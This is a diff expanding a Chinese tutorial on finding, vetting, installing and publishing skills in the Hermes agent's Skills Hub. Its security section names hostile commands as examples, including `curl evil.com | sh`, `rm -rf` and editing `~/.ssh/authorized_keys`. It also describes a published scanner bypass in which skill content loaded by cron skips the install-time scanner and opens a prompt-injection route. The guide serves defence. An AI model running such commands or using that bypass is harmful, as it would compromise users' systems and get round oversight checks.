@@ -25,70 +25,524 @@
 
 > 系列第 8 篇 · 读者预设：不想全部造轮子、想用社区 skill 的人 · 最后核实：2026-07
 
-**TL;DR：** Skills Hub 是 Hermes 的 skill 市场——社区发布、浏览、安装。能省大量造轮子的时间，但也有坑：质量参差、可能过时、安全得自己把关。原则：**先 Hub 再手写**，但装之前看 issue、看更新时间、看作者。
+**TL;DR：** Skills Hub 是 Hermes 的 skill 市场——社区发布、浏览、安装、再发布。Hermes 默认就带 100+ 个 bundled skill，Hub 还能聚合 skills.sh、HermesHub、官方可选 skill 等十几个 registry，号称已经爬到 9 万+ 条目。能省下大量造轮子的时间，但代价是质量参差、可能过时、安全得自己把关。这一篇讲清楚三件事：怎么找、怎么装、怎么挑；再讲一件更难的——怎么把自己写的 skill 发出去给社区用，又不泄密又不坑人。
 
-## Skills Hub 是什么
+如果你还没读过第 6 篇（agentskills.io 标准和 skill 文件结构）和第 7 篇（手写一个 skill），先扫一眼再回来。本篇默认你已经知道 SKILL.md 长什么样、frontmatter 有哪些字段。
 
-官方的 skill 共享平台，装好后内置在 Hermes 里。和 agentskills.io 标准打通——别人发布的 skill 符合标准，你装下来直接能用（第 6 篇讲过这个标准的跨工具性）。
+---
 
-核心动作三个：
+## 一、Skills Hub 到底是什么
 
-- **浏览**：`/skills` 或对应命令看有什么。按分类、热度、最近更新筛。
-- **安装**：一条命令把 skill 拉到本地 `~/.hermes/skills/`。
-- **发布**：你写好的 skill 可以推上去给社区用。
+先把概念厘清楚，不然后面命令会乱。
 
-## 先 Hub 再手写
+**Skills Hub 不是一个单独的网站。** 它是 Hermes 内置的一个聚合层，把好几个 skill 来源接到一起。Hermes 官方文档（`hermes-agent.nousresearch.com/docs/user-guide/features/skills`）里把它分成四类来源：
 
-写 skill 之前先搜 Hub。理由：
+1. **bundled skills**——Hermes 装好就自带的官方 skill 库，目前 100+ 条，覆盖 24+ 个顶层分类（autonomous-ai-agents、software-development、devops、mlops、red-teaming 等）。这部分被复制到 `~/.hermes/skills/`，离线也能用。
+2. **skills.sh**——公开的 skill 目录/registry，社区发布的主战场。装一条 skill 的标准命令长这样：`hermes skills install skills-sh/<org>/<repo>/<skill-name>`。
+3. **direct well-known skill endpoints**——一些有自己 endpoint 的大型 skill 项目，不通过 skills.sh 也能直接拉。
+4. **official optional skills**——官方维护但默认不装、需要时再拉的 skill。
 
-- 常见需求（git 操作、文档生成、特定 SaaS 集成）大概率有人写过。
-- 现成的能当模板，哪怕不直接用，改改比自己从零写快。
-- 多人维护的 skill 比你一个人的更可能跟上工具 API 的变化。
+这套东西的"市场"概念和 npm、pip、cargo registry 是同一类东西：一个让陌生作者发布的、可被任意消费者拉下来执行的代码单元汇聚地。区别在于——**skill 不是代码包，它是 agent 在运行时会读进上下文的指令文档，外加它可能驱动的工具**。这个区别决定了安全模型完全不一样（后面会专门讲）。
 
-## 怎么挑：四看
+Skills Hub 和第 6 篇讲的 agentskills.io 标准是打通的：发布到 skills.sh 的 skill 要符合 agentskills.io 的目录约定和 frontmatter，所以理论上你从 Hub 装下来的 skill 在任何遵循这个标准的 agent 里都能用，不是 Hermes 专属。
 
-社区 skill 质量差距很大。装之前看四点：
+实际数字（截至 2026 年 7 月公开渠道能看到的）：
 
-1. **更新时间**：超过 3 个月没动？Hermes 迭代飞快，老 skill 可能已经和新 API 不兼容。看 commit 历史。
-2. **issue / 评论**：有人报错没人理的，跳过。issue 区是 skill 健康度的真实指标。
-3. **作者**：是活跃社区成员还是一次性的 fork？持续维护的可能大得多。
-4. **代码 / 步骤是否透明**：skill 正文看得见吗？看不见黑盒 skill 装上来你不知道它干了啥——尤其是会调外部 API、读写文件的，必须能读到步骤。
+- Reddit r/hermesagent 在 6 月初报告 Hermes 仓库从 165K star / 310 skill 涨到 188K star / 90,881 skill across 12 registries（两周内）。
+- Hermes 中文文档（majiabin.com 镜像）描述 Skills Hub 接口拉到「88,000+ skills across every registry」。
+- 官方 bundled catalog 在 `hermes-agent.nousresearch.com/docs/reference/skills-catalog` 有逐条参考页。
 
-## 安全：skill 是会执行操作的
+数字越大越要警惕——9 万条目意味着 99% 是噪声，能直接拿来用的可能不到 5%。所以本篇一半篇幅在讲怎么挑、怎么审。
 
-skill 不是纯文本——它驱动 agent 调工具，工具会真改你的系统（写文件、发消息、调 API、跑 shell）。装陌生 skill 前想清楚：
+---
 
-- **它会调外部服务吗**：把数据发到第三方 API 的 skill，数据出域了你可能不知道。
-- **它有写权限吗**：动文件系统的 skill，看清楚写哪里。配合第 20 篇的 command approval，危险操作要你批准。
-- **别装没 source 的 skill**：闭源 skill 等于让陌生人远程操作你的 Hermes。
+## 二、三个核心动作：浏览 / 安装 / 发布
 
-最稳的做法：装到测试环境先跑几轮，确认行为再放生产。
+Skills Hub 的所有操作就这三个。一个个拆。
 
-## 发布你自己的 skill
+### 2.1 浏览：先看再装
 
-写顺手的 skill 推到 Hub 是双赢——社区得到工具，你得到反馈和迭代。发布前 checklist：
+最常用的几条命令（来自官方 CLI 参考）：
 
-- **脱敏**：删掉任何 hardcoded 的 token、私有 URL、客户信息。
-- **写清楚触发条件和边界**：别人装上能不能立刻对上号，全看 description。
-- **标版本和兼容性**：在哪个 Hermes 版本测过、依赖哪些工具。
-- **留个 issue 入口**：让别人能报问题。
+```bash
+# 进入交互式浏览界面（TUI），按分类/热度/最近更新筛
+hermes skills browse
 
-## 真实坑
+# 列出已安装的 skill
+hermes skills list
 
-- **装了一堆不用的**：跟 npm 装太多包一样，skill 库越大检索越慢、命中越乱。定期清理（Curator 会归档，但你自己主动审一遍更稳）。
-- **过度信任热门 skill**：热度高不等于对你合适。一个面向英文开发者的 skill 装到中文场景可能各种错位。
-- **fork 不更新**：装了个 fork，原仓库修了 bug 这个 fork 没跟。能追上游就追上游。
+# 关键词搜索（同时搜 bundled + skills.sh + 其他 registry）
+hermes skills search "git commit"
 
-## 权衡
+# 限定来源搜，避免被 skills.sh 的噪声淹没
+hermes skills search "diagram" --source bundled
+hermes skills search "diagram" --source skills-sh
 
-Hub 的核心交易：**省时间 vs 增加信任成本**。现成 skill 让你快速搭起能力，但你得花精力判断它安不安全、是不是真好用。完全不审就装等于把 Hermes 的部分控制权交出去。
+# 看某条 skill 的元信息和 README
+hermes skills info skills-sh/vercel-labs/json-render/json-render-react
+```
 
-## 结论
+`hermes skills browse` 进去是一个交互界面，可以按方向键走分类、看每条的 description、star 数、最近更新时间、作者。这是发现 skill 最快的方式，比直接 `search` 更适合「我不知道我要什么，但我有问题」的场景。
 
-先 Hub 再手写，但装之前看更新时间、issue、作者、是否开源。skill 会执行操作，安全你自己把关。装完定期清理不用的。
+实操建议：
+
+- **先 bundled 再 skills.sh**。bundled 是官方维护、随版本迭代的，质量下限有保证。bundled 里没有再去 skills.sh 找。
+- **search 时加 `--source`**。skills.sh 现在条目极多，不加 source 你的搜索结果会被低质量 fork 淹没。
+- **看 description 多于看名字**。skill 命名没有强约束，名字接近的 skill 功能可能差很远。
+
+### 2.2 安装：一条命令，但要懂它在干什么
+
+最朴素的安装命令：
+
+```bash
+hermes skills install skills-sh/<org>/<repo>/<skill-name>
+
+# 例子：装 vercel-labs 的 json-render skill
+hermes skills install skills-sh/vercel-labs/json-render/json-render-react
+```
+
+装下来之后会发生这些事：
+
+1. skill 被拉到本地 `~/.hermes/skills/<skill-name>/`，包括 `SKILL.md` 和它带的任何 reference 文件、脚本。
+2. Hermes 的 skill loader 在下一次会话开始时把它的 metadata 注册进去（不会立刻把正文塞进上下文，第 6 篇讲过 progressive disclosure）。
+3. **官方文档明确：安装是 user-driven 的。** Hermes 自己不会自动装陌生 skill——这是安全设计上的硬规矩（dev.to 上的深度文章专门强调过这点）。如果你看到 agent 自己跑 `hermes skills install ...`，要么是你授权了某个 bundled skill 这么做，要么是配置出了问题。
+
+装完之后想确认：
+
+```bash
+hermes skills list          # 看它在不在
+hermes skills info <name>   # 看 metadata 和正文
+```
+
+卸载和升级：
+
+```bash
+hermes skills uninstall <skill-name>
+hermes skills update <skill-name>      # 拉最新版
+hermes skills update --all             # 全量升级（小心，可能引入 breaking change）
+```
+
+`update --all` 我个人不推荐一键跑——skill 升级可能换触发条件、改输出格式，把你别的 skill 的依赖搞坏。建议一次升一个，升完跑一遍回归。
+
+### 2.3 发布：把自己的 skill 推上去
+
+发布流程在第 7 篇结尾提过，这里展开。skills.sh 是主 registry，发布走 `skills` 这个 npm 包提供的 CLI（`npm i -g skills`）。
+
+简化流程：
+
+```bash
+# 1. 进到你 skill 的目录（含 SKILL.md 的那个）
+cd ~/code/my-skills/slack-incident-draft
+
+# 2. 校验是否符合 agentskills.io 标准
+skills validate .
+
+# 3. 登录 skills.sh（首次）
+skills login
+
+# 4. 发布
+skills publish .
+```
+
+发布前要做的事比命令本身重要得多——脱敏、写 description、标版本兼容、留 issue 入口。这部分后面「发布自己的 skill」一节会单独讲。
+
+---
+
+## 三、原则：先 Hub 再手写
+
+写新 skill 之前，先去 Hub 搜。这不是偷懒，是工程纪律。理由：
+
+1. **常见需求大概率有人写过。** git 操作、文档生成、特定 SaaS 集成（Linear、Notion、Slack、Jira）、PDF 解析、API mock、log 分析——这些通用场景，Hub 上不止一个版本。哪怕你装下来觉得不顺手，把它当模板改一改也比从零写快。
+2. **现成 skill 能让你快速判断「这件事值不值得做成 skill」。** 如果你装了三个同类 skill 都没解决你的问题，可能问题不在 skill 而在工具链或场景定义。
+3. **多人维护的 skill 比你一个人跟得更勤。** Hermes 的工具 API、底层 model 的行为变化都很快。一个有 50 个 contributor 的 skill，跟上 API 变化的概率比你单打独斗高得多。
+
+但要避免反向陷阱——**别把 Hub 当免责理由**。「我装的是高 star 的 skill，出问题不怪我」这种心态在工程上不成立。skill 装上来是你在跑，后果是你的。
+
+正确顺序：
+
+```
+搜 Hub → 找不到合适的 → 找到但不安全/过时 → 找到但不能直接用 → 才考虑手写
+                          ↓                       ↓
+                       评估替代               改造成你的 fork
+```
+
+第 7 篇讲的是手写路径，本篇讲前三步。
+
+---
+
+## 四、怎么挑：四看
+
+社区 skill 质量分布是典型的长尾——头部几十条是真好用，中间几千条勉强能跑，剩下几万条是 fork、abandonware、随手发的实验代码。装之前过这四关：
+
+### 4.1 看更新时间
+
+Hermes 自己迭代飞快。3 个月没动的 skill，和新版 Hermes 的兼容性就要打问号；半年没动的，基本可以当 abandonware 看。
+
+怎么看：
+
+```bash
+hermes skills info <name>      # 看最后更新时间
+```
+
+或者直接去 skill 的源仓库看 commit 历史。如果只是 README 改动多、代码不动，说明作者在维护文档但没在维护逻辑——这往往意味着逻辑已经稳定，但也可能意味着没人用了。
+
+注意 release 频率 ≠ 维护质量。有些 skill 一年只更一两次，因为它做的事情就那么大，稳定不需要频更。看的是「最近一次有意义 commit 距今多久」和「有没有人在 issue 区回答问题」。
+
+### 4.2 看 issue 和评论活跃度
+
+issue 区是 skill 健康度的真实指标。判断标准：
+
+- **有人报错，作者/社区有回应**——健康。
+- **有人报错，零回应，issue 堆着**——弃疗信号。
+- **issue 数极多但都是「same here」+1**——说明这个 skill 解决了真问题但有 bug，作者没空修。
+- **零 issue**——可能是新发布的，也可能是没人用。看 star 数和发布时间综合判断。
+
+star 数本身意义有限——Hermes 生态里很多高 star 的 skill 是因为名字起得好、出现得早，不一定是质量最好。issue 区反映的是真实使用情况。
+
+### 4.3 看作者
+
+是不是活跃社区成员？发过几个 skill？有没有在 r/hermesagent、官方 Discord、GitHub discussions 出现？
+
+- **一次性 fork 账号**——风险高。作者可能就是把别人的 skill 改个名字发上来，没打算维护。
+- **有持续输出的人**——风险低。哪怕这个 skill 你不熟，作者还在做别的，找得到。
+- **官方/知名团队**——bundled skill 或者带 verified 标记的，最稳。
+
+注意 skills.sh 没有像 npm 那样严格的所有权验证（截至 2026 年 7 月），同名/近名 skill 容易混。装之前确认 author 字段对得上你想装的那个项目。
+
+### 4.4 看代码和步骤是否透明
+
+这一条最重要。skill 不是纯文本，它驱动 agent 调工具，工具会真改你的系统。**装一个看不到步骤的 skill，等于让陌生人在你的 Hermes 里远程操作。**
+
+判断透明度：
+
+- **SKILL.md 正文看得见**——最低要求。装下来之后 `cat ~/.hermes/skills/<name>/SKILL.md`，能读到完整的触发条件、步骤、调用什么工具。
+- **reference 文件可读**——好 skill 会把详细逻辑放进 reference 文档（第 6 篇讲过 progressive disclosure），这些文档你应该能直接看。
+- **脚本/可执行部分有源码**——如果 skill 带了脚本（比如调外部 API 的 wrapper），你要能看到源码而不是只有编译产物。
+- **闭源 skill 一律不装**——除非你能完全审计它的行为，否则别让闭源 skill 接触有敏感数据的环境。
+
+四看走完，剩下的是「装到测试环境先跑几轮」——这是底线。哪怕四看全过，也别直接装到带生产数据的环境里。开一个干净的 Hermes 实例（容器或独立 user），让 skill 跑几轮你设计好的输入，看它的实际行为再决定。
+
+---
+
+## 五、安全：skill 是会执行操作的
+
+这是本篇最重要的一节，也是新手最容易低估的部分。
+
+### 5.1 skill 的破坏力来自哪里
+
+skill 本身是 markdown 文档，看起来人畜无害。但 skill 在 agent 里运行时干两件事：
+
+1. **把指令塞进 agent 的上下文**——改变 agent 接下来怎么理解和回应用户。
+2. **指示 agent 调工具**——bash、文件读写、HTTP 请求、shell 命令、MCP server 提供的任何工具。
+
+第二点是真正的破坏力来源。一条 skill 可以让 agent：
+
+- 跑 shell 命令（`rm -rf`、`curl | sh`、改 `~/.ssh/authorized_keys`）；
+- 读写文件系统（你的代码、你的密钥文件、你的 browser cookie）；
+- 调外部 API（把你的数据发到第三方服务器）；
+- 调 MCP server（每个 MCP server 都跑在 agent 的权限下，没有签名、没有默认沙箱——Medium 上 Kisztof 的 review 专门强调了这点）。
+
+Hermes 有安全机制：每条命令执行前会过一遍危险模式匹配（官方 Security 文档），命中危险模式要用户显式批准；skill 在 install 时会过一遍 security scanner，扫 prompt injection、data exfiltration、destructive command。第 17 篇讲权限、第 20 篇讲 command approval，会展开这套机制。
+
+### 5.2 scanner 不是万能的
+
+Hermes 的 install-time scanner 是基于模式的，能挡掉低水平的恶意 skill（比如明文写着 `curl evil.com | sh` 的）。但它有已知 bypass：
+
+- **GitHub Issue #3968**：cron 任务在执行时通过 `_build_job_prompt`（`cron/scheduler.py`）加载的 skill 内容**不经过 scanner**。配合 cron 的非交互模式，等于一条 prompt-injection 的绕过路径。这是已经公开的 issue，意味着作者知道、社区知道、攻击者也知道。
+- **CSA 2026-05 的研究笔记**：9 天内 9 个 CVE 披露，其中间接 prompt injection 通过 retrieved memory 进入上下文，是 EDR 工具覆盖不到的盲区。
+- **arXiv 2605.13471**：分析 always-on agent（OpenClaw、Hermes Agent）的 persistent injection 攻击面，因为这类 agent 把 messaging、memory、tool-calling 折叠成一个进程，跑在 owner 身份下，攻击面是叠加的。
+
+结论：**scanner 是第一道筛，不是最后一道**。装陌生 skill 时把它当不可信代码处理，跑在隔离环境里观察。
+
+### 5.3 装陌生 skill 前的检查清单
+
+把上面四看和安全合在一起，给一份实操 checklist：
+
+- [ ] SKILL.md 正文读了一遍，理解它声称做什么。
+- [ ] 看清楚它声明要调哪些工具（bash？文件写？HTTP？）。
+- [ ] 如果带脚本/reference，读源码，特别注意 `curl`、`httpx`、`requests`、`fetch`、`subprocess`、`exec`、`eval`。
+- [ ] 看 issue 区有没有人报「skill 做了意料之外的事」。
+- [ ] 看作者在 skills.sh / GitHub / 社区的活跃度。
+- [ ] 看最后更新时间，判断是否兼容当前 Hermes 版本。
+- [ ] 装到独立环境（容器、独立 user、独立 home）先跑。
+- [ ] 给它配最窄的 tool 权限（参考第 17 篇的权限分级）。
+- [ ] 跑几轮后看 `~/.hermes/logs/`，对照它实际调了什么。
+- [ ] 确认没问题，再考虑放到主环境。
+
+这一套走完大约 15-30 分钟。听起来繁琐，但比起「skill 偷了你的 AWS key 然后你解释为什么云账单多了几万块」，这 30 分钟值得。
+
+### 5.4 特别危险的几类 skill
+
+按破坏力排序，从高到低：
+
+1. **跑 shell 的 skill**——最高危。任何 `bash`/`exec` 类 skill 都要审它实际跑什么命令。
+2. **发 HTTP 请求的 skill**——数据出域。看它发到哪个域名、发什么 payload。
+3. **写文件系统的 skill**——看你写在哪。写到 `~/.hermes/` 没问题，写到 `~/.ssh/` 或 `~/.aws/` 就是红旗。
+4. **调 MCP server 的 skill**——MCP server 跑在 agent 权限下，等于把 agent 的全部权限借给 skill。
+5. **纯文本处理 skill**（重写、翻译、摘要）——最低危，主要风险是 prompt injection 让它输出误导内容。
+
+第 1、2 类如果不在沙箱里跑，至少要做到 command approval 强制开启（第 20 篇）。
+
+---
+
+## 六、发布你自己的 skill
+
+写顺手的 skill 推到 Hub 是双赢——社区得到工具，你得到反馈和迭代。但发布前有一堆事情要做，不然就是给社区添堵。
+
+### 6.1 脱敏
+
+发布前最关键的一步。**任何 hardcoded 的敏感信息都要删掉。** 重点扫：
+
+- API key / token / secret（最容易漏的是写 skill 时为了测试临时塞进去的）。
+- 私有 URL（公司内部域名、staging 环境、私有 git remote）。
+- 客户信息（公司名、用户邮箱、客户 ID）。
+- 个人身份信息（手机号、地址）。
+- cookie / session 数据（如果你写过 web 抓取的 skill，特别注意）。
+
+工具上：
+
+```bash
+# 用 gitleaks 或 trufflehog 扫一遍 skill 目录
+gitleaks detect --source . --no-banner
+
+# skills.sh 自己的 validate 也会跑基本检查
+skills validate .
+```
+
+注意 validate 通过不等于脱敏干净。它只查已知的 secret 模式，查不出「这是你公司内部系统但看起来像普通 URL」的东西。人眼复审不可省。
+
+### 6.2 写好 description 和 frontmatter
+
+别人装不装你的 skill，几乎全看 description。一份合格的 description 要回答：
+
+- **这个 skill 做什么**（一句话）。
+- **什么时候触发它**（什么场景、什么关键词）。
+- **什么时候不触发**（避免误激活）。
+- **依赖什么**（需要什么工具、什么 Hermes 版本、什么外部服务）。
+- **不做什么**（边界，避免被滥用）。
+
+frontmatter 字段示例（第 6 篇详细讲过结构）：
+
+```yaml
+---
+name: slack-incident-draft
+description: |
+  在收到监控告警或用户上报后，起草一份 incident 报告骨架（影响范围、时间线、怀疑原因、下一步）。
+  触发：用户提到「incident」「事故」「告警」「线上问题」并要求起草或汇总。
+  不触发：日常 standup、普通 bug 讨论、非紧急回溯。
+  依赖：可选调用 Slack API（需要 SLACK_BOT_TOKEN 环境变量）读取最近 channel 消息。
+  输出：Markdown 报告，写到当前会话工作目录。
+version: 0.3.0
+author: your-handle
+license: MIT
+hermes_version: ">=2.4"
+tags: [incident-management, sre, slack]
+---
+```
+
+关键点：
+
+- **`hermes_version` 字段**——标你测过的版本。新版 Hermes 出来你跑通了再更新这个字段。
+- **`tags`**——让别人能搜到。挑常见 tag，别生造。
+- **`description` 用 YAML 多行字符串**——长 description 不要塞单行，换行更易读。
+
+### 6.3 版本和兼容性
+
+发布前明确：
+
+- 在哪个 Hermes 版本测过？
+- 依赖哪些工具（bash、特定 MCP server、特定 OS）？
+- 是否依赖外部 API（如果有，列出限速、配额、需要的 key）。
+
+把这些写进 SKILL.md 顶部的「Requirements」段。装下来的人第一眼能看到。
+
+版本号遵循 semver：
+
+- 修 bug、调措辞 → patch（0.3.0 → 0.3.1）。
+- 加新功能、改触发条件（向后兼容）→ minor（0.3.1 → 0.4.0）。
+- 改输出格式、删字段、不兼容旧用法 → major（0.4.0 → 1.0.0）。
+
+社区 skill 最常见的坑就是作者随手改触发条件没升 major，下游一堆人炸。别当那种作者。
+
+### 6.4 留 issue 入口
+
+发布时务必留一个能让人报问题的渠道：
+
+- 如果 skill 在 GitHub，issue tracker 开着。
+- 如果只是发到 skills.sh，至少在 SKILL.md 底部留作者联系方式（邮箱、handle、Discord 用户组）。
+- 考虑在 SKILL.md 加一个 `## Known Issues` 段，列已知的坑——比让人踩了再去 issue 区骂强。
+
+发布之后维护比发布本身重要。常见坑：
+
+- **发布了不管**——装上去的人报 bug 几个月没人理，下次再没人装。
+- **频繁 breaking change**——升版本太勤，下游跟不上。
+- **不标 deprecated**——你已经不维护了，但还让人能搜到、能装。要么显式标 deprecated，要么从 registry 下架。
+
+---
+
+## 七、npm 类比与定期清理
+
+skill 库越大，检索越乱、命中越不准——这和 npm 装太多包是一个问题，但比 npm 更严重，因为 skill 会进 agent 上下文，影响 agent 对每个请求要「想」多久、走哪个分支。
+
+### 7.1 npm/pip 类比
+
+| 维度 | npm package | Hermes skill |
+|---|---|---|
+| 单元形态 | 可执行代码 | 指令文档 + 可能的工具调用 |
+| 进入方式 | 显式 import | agent 自动按触发条件激活 |
+| 副作用 | 在调用时产生 | agent 一旦激活就可能调工具 |
+| 升级风险 | API breaking | 触发条件/输出格式变化 |
+| 安全模型 | 签名 + audit | scanner + 用户审批 |
+| 数量级 | 200 万+ | 9 万+（且增长快） |
+
+最大的区别在第二行：npm 你不 import 就不会跑，skill 是 agent 自己决定要不要激活。这意味着 skill 装多了之后，agent 的行为越来越不可预测——你不知道哪个 skill 会在什么奇怪输入下被激活。
+
+### 7.2 定期清理
+
+建议每月或每升级 Hermes 大版本时做一次清理：
+
+```bash
+# 看现在装了什么
+hermes skills list
+
+# 看每条 skill 最近多久没被激活（如果 Hermes 提供这个统计）
+hermes skills stats
+```
+
+清理标准：
+
+- **过去 30 天没被激活过**——候选下架。
+- **依赖的工具已经不存在**（比如 MCP server 下线了）——下架。
+- **有更稳定的替代品**——迁移过去，旧的卸载。
+- **你装了但没读懂**——优先卸载，别留黑盒。
+
+Curator（第 5 篇讲过那个自动整理 skill 库的角色）会做一部分归档工作，但**它归档的是它认为你不用的，不一定对**。最终审计要你自己来，别完全交给自动逻辑。
+
+### 7.3 锁定版本
+
+Hermes 支持 skill 版本锁定（具体语法看官方 `Creating Skills` 文档）。生产环境强烈建议锁定，避免某天 skill 作者发了个 breaking change 你的 pipeline 突然挂掉。
+
+---
+
+## 八、真实社区 skill 解剖
+
+光讲道理不够，挑两个真实存在的社区 skill 看看四看怎么用。
+
+### 8.1 案例：vercel-labs/json-render
+
+这是官方文档反复用来举例的 skill（出现在 `hermes skills install skills-sh/vercel-labs/json-render/json-render-react` 这条命令里），路径 `skills-sh/vercel-labs/json-render`。
+
+过四看：
+
+- **更新时间**：vercel-labs 是 Vercel 的官方实验性仓库，活跃度高，跟着 React/Hermes 版本节奏走。
+- **issue 活跃度**：在 vercel-labs 主仓库下，有人维护。
+- **作者**：vercel-labs 是 verified org，可信度最高一档。
+- **代码透明**：完全开源，SKILL.md 和 reference 都在仓库里。
+
+这个 skill 是「先 Hub 再手写」原则的好例子——你想让 agent 把 JSON 数据渲染成 React 组件预览，自己写要折腾 schema、render 模板、错误处理，装这一条省一个下午。
+
+但即便如此也别直接装到生产。装下来读一遍 SKILL.md，看它的触发条件会不会和你已有的 skill 冲突（比如你已经有一个「JSON 可视化」skill，两个会抢触发）。
+
+### 8.2 案例：red-teaming/prompt-injection-*
+
+Hermes bundled catalog 里有一类 red-teaming skill，路径形如 `red-teaming/prompt-injection-*`。这类 skill 是用来给你做对抗测试的——让你的 agent 模拟收到 prompt injection 攻击，看防御怎么样。
+
+过四看：
+
+- **来源**：bundled，官方维护，可信度最高。
+- **目的**：明确——它在 SKILL.md 里会写清楚自己是 adversarial testing 用途。
+- **风险点**：这类 skill 本身就是模拟攻击，激活它会触发 agent 试图绕过自己的防御。**不要在生产环境激活**，更不要在有真实用户数据的会话里激活。
+
+这个案例说明一个反直觉的事：**官方 bundled skill 也有风险**，风险不在它恶意（它是官方的），而在它的设计目的就是要触发危险行为。哪怕是 bundled skill，也要分环境用。
+
+### 8.3 案例：第三方 SaaS 集成类 skill（典型坑）
+
+抽象讲一个常见坑的形态，因为具体名字经常变。这类 skill 通常长这样：
+
+- 名字类似 `<saas-name>-integration` 或 `<saas-name>-sync`。
+- 描述里说「自动同步你的 X 数据到 Y」。
+- 装下来需要你设一个 API token 环境变量。
+- 作者是个人账号，star 数 10-50，最后更新 4 个月前。
+
+这类 skill 是 Hub 上最常见的雷区：
+
+- **作者热情期过了**——SaaS 改了 API，skill 就废了，没人修。
+- **token 范围不可控**——很多 SaaS 的 token 是宽权限的（读所有数据、写所有数据），skill 拿到就是全权代理。
+- **数据出域**——你不知道 skill 把你的数据发去哪。哪怕 skill 自己只是调 SaaS 官方 API，万一作者塞了一层中间转发呢？
+
+如果一定要装这类，至少：
+
+- 给它一个最小权限的 token（多数 SaaS 支持 scope 限制）。
+- 跑在隔离环境。
+- 看一遍 source 确认它只调官方 API endpoint，没有第三方转发。
+
+---
+
+## 九、和 Curator、自我改进的分工
+
+本篇讲的是人肉操作 Hub。Hermes 体系里还有两个角色和 Hub 强相关：
+
+- **Curator（第 5 篇）**——自动归档不用的 skill、给 skill 分类、提示冲突。它做的是整理工作，不替代你的判断。
+- **自我改进（第 9 篇）**——agent 自己观察哪些 skill 用得多、哪些失败、写新 skill 补漏。`skill_manage` 工具支持 create / patch / edit / delete（SSOJet 的文章列了 8 种 agent 自动写的 skill）。
+
+分工原则：
+
+- **人决定风险**——装陌生 skill、给 skill 危险工具权限，这些是人的决策。
+- **agent 做重复劳动**——发现缺口、起草 skill 初稿、维护 skill 库整洁，这些交给自动。
+- ** Curator 不能替你判断可信度**——它能告诉你「这条 skill 30 天没用过」，不能告诉你「这条 skill 的作者是否可信」。
+
+第 9 篇会展开讲 agent 自我生成 skill 的边界——什么时候放手让它写、什么时候必须人审。
+
+---
+
+## 十、常见误区
+
+汇总新手最常踩的坑：
+
+1. **「高 star = 高质量」**——错。Hermes 生态里 star 集中在早期项目，不代表当前最佳。
+2. **「bundled 就一定安全」**——大部分情况安全，但 red-teaming 类 bundled skill 也有触发风险。看用途。
+3. **「scanner 挡得住一切」**——错。Issue #3968 已经证明 cron 路径有 bypass。
+4. **「装了就用，出问题再说」**——最危险的姿势。skill 调用的工具一旦执行，rollback 成本可能极高（数据被改、被发出去、被删）。
+5. **「fork 一样能用」**——fork 不一定跟得上 upstream 的 bug 修复。能追上游就追上游。
+6. **「面向英文开发者的 skill 在中文场景一样能用」**——错位很多。触发关键词、输出风格、错误消息都是英文的，中文输入下激活率会低、输出可能夹英文。
+7. **「发布就是结束」**——发布是开始。维护、回应 issue、跟版本升级，才是 skill 长期价值所在。
+
+---
+
+## 十一、权衡与结论
+
+Hub 的核心交易：**省时间 vs 增加信任成本**。现成 skill 让你快速搭起能力，但你得花精力判断它安不安全、是不是真好用、值不值得长期依赖。完全不审就装等于把 Hermes 的部分控制权交出去；过度审又会丧失 Hub 本来要给的效率优势。
+
+合理的平衡点是：
+
+- **bundled + verified 作者的 skill**：四看走轻量版（看 description、看 issue），可以直接进开发环境。
+- **skills.sh 上活跃作者的 skill**：四看走完整版，先进隔离环境。
+- **陌生作者的 skill**：四看 + 代码审计 + 隔离环境，跑通再考虑。
+- **闭源 / 黑盒 skill**：不装。
+
+先 Hub 再手写，但装之前看更新时间、issue、作者、是否开源。skill 会执行操作，安全你自己把关——scanner 是第一道，不是最后一道。装完定期清理，库里只留你信任且常用的。
+
+下一篇（第 9 篇）讲自我改进——agent 怎么自动发现 skill 缺口、写新 skill、维护 skill 库。届时本篇的人肉流程会和自动流程合流，组成完整的 skill 生命周期管理。
+
+---
 
 ## 延伸阅读
 
-- [Hermes Skills Hub](https://hermes-agent.nousresearch.com/docs/)
-- [Hermes Bundled Skills Catalog（官方内置 skill 清单）](https://hermes-agent.nousresearch.com/docs/reference/skills-catalog)
-- [第 6 篇：agentskills.io 标准](./06-agentskills-standard-and-skill-file-structure.md)
+- [Skills System | Hermes Agent（官方）](https://hermes-agent.nousresearch.com/docs/user-guide/features/skills) — 浏览/搜索/安装/管理命令的权威参考。
+- [Working with Skills | Hermes Agent](https://hermes-agent.nousresearch.com/docs/guides/work-with-skills) — 找、装、用、写 skill 的官方指南。
+- [Creating Skills | Hermes Agent](https://hermes-agent.nousresearch.com/docs/developer-guide/creating-skills) — 发布 skill 的开发指南。
+- [Bundled Skills Catalog](https://hermes-agent.nousresearch.com/docs/reference/skills-catalog) — 官方内置 skill 清单，逐条参考页。
+- [Security | Hermes Agent](https://hermes-agent.nousresearch.com/docs/user-guide/security) — 危险模式匹配、审批工作流、信任分级、install-time scanner。
+- [HermesHub（社区 registry）](https://github.com/amanning3390/hermeshub) — 实现 ARD v0.9 规范的社区 skill registry。
+- [Top Skills for Hermes Agent — HermesAtlas](https://hermesatlas.com/lists/top-skills) — 按 star 排序的 skill/registry 列表。
+- [0xarkstar/awesome-hermes-agent](https://github.com/0xarkstar/awesome-hermes-agent) — 社区维护的资源汇总。
+- [Issue #3968 — Cron prompt injection via skill content](https://github.com/NousResearch/hermes-agent/issues/3968) — scanner bypass 的已披露路径，理解安全模型必读。
+- [9 CVEs in 4 Days — CSA Research Note](https://labs.cloudsecurityalliance.org/research/csa-research-note-hermes-agent-cves-20260504-csa-styled/) — 2026-05 一波 CVE 复盘。
+- [Persistent Prompt Injection in Always-on Autonomous AI Agents — arXiv](https://arxiv.org/html/2605.13471) — always-on agent 攻击面学术分析。
+- [Hermes Agent — Deep Dive & Build-Your-Own Guide](https://dev.to/truongpx396/hermes-agent-deep-dive-build-your-own-guide-1pcc) — 含 install 是 user-driven 的安全设计讨论。
+- 第 5 篇：[Curator 与 skill 库自动归档](./05-curator-skill-library.md)
+- 第 6 篇：[agentskills.io 标准](./06-agentskills-standard-and-skill-file-structure.md)
+- 第 7 篇：[手写第一个 skill](./07-write-your-first-skill.md)
+- 第 9 篇：[自我改进与 skill 自动生成](./09-self-improvement.md)
+- 第 17 篇：[权限模型](./17-permission-model.md)
+- 第 20 篇：[command approval](./20-command-approval.md)
